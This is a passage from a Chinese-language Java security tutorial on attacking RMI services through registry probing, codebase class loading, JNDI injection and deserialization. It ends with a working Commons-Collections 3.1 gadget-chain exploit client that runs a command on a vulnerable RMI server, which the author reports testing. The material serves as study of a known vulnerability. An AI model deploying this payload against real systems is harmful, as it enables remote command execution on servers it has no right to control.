实际上是不行的。
RMI注册中心只有对于来源地址是localhost的时候，才能调用rebind、 bind、unbind等方法。  
不过list和lookup方法可以远程调用。
list方法可以列出目标上所有绑定的对象：  
`String[] s = Naming.list("rmi://192.168.135.142:1099");`
lookup作用就是获得某个远程对象。  
如果对方RMI注册中心存在敏感远程服务，就可以进行探测调用（[BaRMIE工具](https://github.com/NickstaDB/BaRMIe)
  1. 直接攻击RMI服务器
他的RMI服务端存在readObject反序列化点。从通讯过程可知，服务端会对客户端的任意输入进行反序列化。
如果服务端存在漏洞组件版本（存在反序列化利用链），就可以对RMI服务接口进行反序列化攻击。我们将在接下来复现这个RMI服务的反序列化漏洞。它将导致RMI服务端任意命令执行。
（讲道理由于客户端同样存在ReadObject反序列化点，恶意服务端也可以打客户端，就不复现了）
  1. 动态加载恶意类（RMI Remote Object Payload）
上面没有说到：  
RMI核心特点之一就是动态类加载。
RMI的流程中，客户端和服务端之间传递的是一些序列化后的对象。如果某一端反序列化时发现一个对象，那么就会去自己的CLASSPATH下寻找想对应的类。
如果当前JVM中没有某个类的定义（即CLASSPATH下没有），它可以根据codebase去下载这个类的class，然后动态加载这个对象class文件。
codebase是一个地址，告诉Java虚拟机我们应该从哪个地方去搜索类；CLASSPATH是本地路径，而codebase通常是远程URL，比如http、ftp等。所以动态加载的class文件可以保存在web服务器、ftp中。
如果我们指定 codebase= ，动态加载 org.vulhub.example.Example 类，  
则Java虚拟机会下载这个文件
Example类的字节码。
那么只要控制了codebase，就可以加载执行恶意类。同时也存在一定的限制条件：
  * 安装并配置了SecurityManager
  * Java版本低于7u21、6u45，或者设置了 java.rmi.server.useCodebaseOnly=false
java.rmi.server.useCodebaseOnly 配置为 true 的情况下，Java虚拟机将只信任预先配置好的 codebase
，不再支持从RMI请求中获取。  
具体细节在java安全漫谈-05 RMI篇（2）一文中有描述。  
这边暂时只是讲述有这个漏洞原理，由于未找到真实利用场景，不细说。
> 漏洞的主要原理是RMI远程对象加载，即RMI Class Loading机制，会导致RMI客户端命令执行的
举一个小栗子：  
客户端：
    ICalc r = (ICalc) Naming.lookup("rmi://192.168.135.142:1099/refObj");//从服务端获取RMI服务
    List li = new Payload();//本地只有一个抽象接口，具体是从cosebase获取的class文件
    r.sum(li);//RMI服务调用，在这里触发从cosebase中读取class文件执行
  1. JNDI注入
RMI服务端在绑定远程对象至注册中心时，不只是可以绑定RMI服务器本身上的对象，还可以使用Reference对象指定一个托管在第三方服务器上的class文件，再绑定给注册中心。  
在客户端处理服务端返回数据时，发现是一个Reference对象，就会动态加载这个对象中的类。  
攻击者只要能够
  1. 控制RMI客户端去调用指定RMI服务器
  2. 在可控RMI服务器上绑定Reference对象，Reference对象指定远程恶意类
  3. 远程恶意类文件的构造方法、静态代码块、getObjectInstance()方法等处写入恶意代码
就可以达到RCE的效果。fasjson组件漏洞rmi、ldap的利用形式正是使用lndi注入，而不是有关RMI反序列化。
有关JNDI注入，以及其fastjson反序列化的例子相关知识太多。这篇只是引出，暂不表述。
> 主要原理是JNDI Reference远程加载Object Factory类的特性。会导致客户端命令执行。  
>  不受java.rmi.server.useCodebaseOnly 系统属性的限制，相对于前者来说更为通用
### 直接攻击RMI服务器 Commons-collections3.1
举例Commons-collection利用rmi调用的例子。
RMI服务端(受害者)，开启了一个RMI服务
    package RMI;
    import java.rmi.Naming;
    import java.rmi.Remote;
    import java.rmi.RemoteException;
    import java.rmi.registry.LocateRegistry;
    import java.rmi.server.UnicastRemoteObject;
    public class Server {
        public interface User extends Remote {
            public String name(String name) throws RemoteException;
            public void say(String say) throws RemoteException;
            public void dowork(Object work) throws RemoteException;
        }
        public static class UserImpl extends UnicastRemoteObject implements User{
            protected UserImpl() throws RemoteException{
                super();
            }
            public String name(String name) throws RemoteException{
                return name;
            }
            public void say(String say) throws  RemoteException{
                System.out.println("you speak" + say);
            }
            public void dowork(Object work) throws  RemoteException{
                System.out.println("your work is " + work);
            }
        }
        public static void main(String[] args) throws Exception{
            String url = "rmi://127.0.0.1:1099/User";
            UserImpl user = new UserImpl();
            LocateRegistry.createRegistry(1099);
            Naming.bind(url,user);
            System.out.println("the rmi is running ...");
        }
    }
同时服务端具有以下特点：
  * jdk版本1.7
  * 使用具有漏洞的Commons-Collections3.1组件
  * RMI提供的数据有Object类型（因为攻击payload就是Object类型）
客户端（攻击者）
    package RMI;
    import org.apache.commons.collections.Transformer;
    import org.apache.commons.collections.functors.ChainedTransformer;
    import org.apache.commons.collections.functors.ConstantTransformer;
    import org.apache.commons.collections.functors.InvokerTransformer;
    import org.apache.commons.collections.map.TransformedMap;
    import java.lang.annotation.Target;
    import java.lang.reflect.Constructor;
    import java.rmi.Naming;
    import java.util.HashMap;
    import java.util.Map;
    import RMI.Server.User;
    public class Client {
        public static void main(String[] args) throws Exception{
            String url = "rmi://127.0.0.1:1099/User";
            User userClient = (User)Naming.lookup(url);
            System.out.println(userClient.name("lala"));
            userClient.say("world");
            userClient.dowork(getpayload());
        }
        public static Object getpayload() throws Exception{
            Transformer[] transformers = new Transformer[]{
                    new ConstantTransformer(Runtime.class),
                    new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]}),
                    new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}),
                    new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc.exe"})
            };
            Transformer transformerChain = new ChainedTransformer(transformers);
            Map map = new HashMap();
            map.put("value", "lala");
            Map transformedMap = TransformedMap.decorate(map, null, transformerChain);
            Class cl = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
            Constructor ctor = cl.getDeclaredConstructor(Class.class, Map.class);
            ctor.setAccessible(true);
            Object instance = ctor.newInstance(Target.class, transformedMap);
            return instance;
        }
    }
亲测可弹计算机，完成任意命令执行。
其实把RMI服务器当作一个readObject复写点去利用。
## 参考
[RMI官方文档](https://stuff.mit.edu/afs/athena/software/java/java_v1.2.2/distrib/sun4x_56/docs/guide/rmi/getstart.doc.html#7738)
java安全漫谈-04.RMI篇(1)
java安全漫谈-04.RMI篇(2)